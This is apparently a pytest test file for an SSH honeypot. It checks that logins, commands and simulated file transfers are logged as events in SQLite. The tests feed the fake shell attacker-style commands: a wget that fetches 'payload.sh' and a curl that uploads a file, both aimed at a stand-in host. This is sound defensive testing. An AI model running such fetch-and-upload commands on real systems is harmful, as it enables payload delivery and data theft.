import asyncio
import json
import sqlite3
from contextlib import closing
from pathlib import Path
from unittest.mock import Mock

import asyncssh
import pytest
import pytest_asyncio
from panopticon.events.event_handler import EventHandler
from panopticon.events.models import Command, FileDownloaded, FileUploaded, LoginAttempt
from panopticon.events.sqlite_store import SQLiteEventStore
from panopticon.honeypots.ssh.server import HoneypotServer


@pytest_asyncio.fixture
async def ssh_client():
    events = Mock(spec=EventHandler)
    host_key = asyncssh.generate_private_key("ssh-ed25519")

    async with asyncssh.create_server(
        lambda: HoneypotServer(events),
        host="127.0.0.1",
        port=0,
        server_host_keys=[host_key],
    ) as server, asyncssh.connect(
        "127.0.0.1",
        port=server.get_port(),
        username="test-user",
        password="testpass123",
        preferred_auth="password",
        client_keys=[],
        known_hosts=None,
        config=None,
        connect_timeout=5,
    ) as connection:
        yield connection, events


async def read_prompt(shell):
    return await asyncio.wait_for(shell.stdout.readuntil("$> "), timeout=5)


@pytest.mark.asyncio
async def test_login_opens_shell(ssh_client):
    connection, events = ssh_client

    async with connection.create_process(term_type="xterm") as shell:
        response = await read_prompt(shell)

        assert "Welcome to the Linux server." in response
        assert response.endswith("$> ")

        login_events = [
            call.args[0] for call in events.publish.call_args_list if isinstance(call.args[0], LoginAttempt)
        ]

        assert len(login_events) == 1
        assert login_events[0].username == "test-user"
        assert login_events[0].success is True


@pytest.mark.asyncio
async def test_shell_records_transfer_attempts(ssh_client: tuple[asyncssh.SSHClientConnection, Mock]) -> None:
    """Checks that transfer commands received over SSH produce correlated attempt events

    Args:
        ssh_client (tuple[SSHClientConnection, Mock]): Connected client and mock event publisher
    """

    connection: asyncssh.SSHClientConnection
    events: Mock
    connection, events = ssh_client

    async with connection.create_process(term_type="xterm") as shell:
        await read_prompt(shell)
        shell.stdin.write("wget https://example.test/payload.sh\n")
        response: str = await read_prompt(shell)

        assert "download attempt recorded" in response

        shell.stdin.write("curl -T readme.txt https://example.test/upload\n")
        response = await read_prompt(shell)

        assert "upload attempt recorded" in response

    transfers: list[FileDownloaded | FileUploaded] = [
        call.args[0]
        for call in events.publish.call_args_list
        if isinstance(call.args[0], (FileDownloaded, FileUploaded))
    ]

    assert len(transfers) == 2
    assert isinstance(transfers[0], FileDownloaded)
    assert isinstance(transfers[1], FileUploaded)
    assert transfers[0].session_id == transfers[1].session_id
    assert transfers[0].src_ip == "127.0.0.1"
    assert transfers[1].size_bytes == len("Welcome to the server.\n".encode())


@pytest.mark.asyncio
async def test_ssh_events_are_persisted(tmp_path: Path) -> None:
    """Checks that a complete SSH interaction is committed to the event database

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
    """

    store: SQLiteEventStore = SQLiteEventStore(tmp_path / "events.sqlite3")
    collector: EventHandler = EventHandler(store)
    host_key: asyncssh.SSHKey = asyncssh.generate_private_key("ssh-ed25519")
    connections: set[asyncssh.SSHServerConnection] = set()

    await collector.start()

    try:
        async with asyncssh.create_server(
            lambda: HoneypotServer(collector, connections),
            host="127.0.0.1",
            port=0,
            server_host_keys=[host_key],
        ) as server, asyncssh.connect(
            "127.0.0.1",
            port=server.get_port(),
            username="test-user",
            password="dummy-password",
            preferred_auth="password",
            client_keys=[],
            known_hosts=None,
            config=None,
            connect_timeout=5,
        ) as connection:
            async with connection.create_process(term_type="xterm") as shell:
                await read_prompt(shell)
                shell.stdin.write("wget https://example.test/payload.sh\n")
                await read_prompt(shell)
                shell.stdin.write("curl -T readme.txt https://example.test/upload\n")
                await read_prompt(shell)

    finally:
        active_connections: tuple[asyncssh.SSHServerConnection, ...] = tuple(connections)

        for active in active_connections:
            active.close()

        await asyncio.gather(*(active.wait_closed() for active in active_connections))
        await asyncio.wait_for(collector.close(), timeout=5)

    with closing(sqlite3.connect(store.path)) as database:
        rows: list[tuple[str, str, str]] = database.execute(
            "SELECT event_type, session_id, payload FROM events ORDER BY rowid"
        ).fetchall()

    assert [row[0] for row in rows] == [
        "connection_open", "login_attempt", "command", "file_download",
        "command", "file_upload", "connection_closed",
    ]
    assert len({row[1] for row in rows}) == 1
    assert json.loads(rows[1][2])["password"] == "dummy-password"
    assert json.loads(rows[3][2])["url"] == "https://example.test/payload.sh"
    assert json.loads(rows[5][2])["simulated"] is True
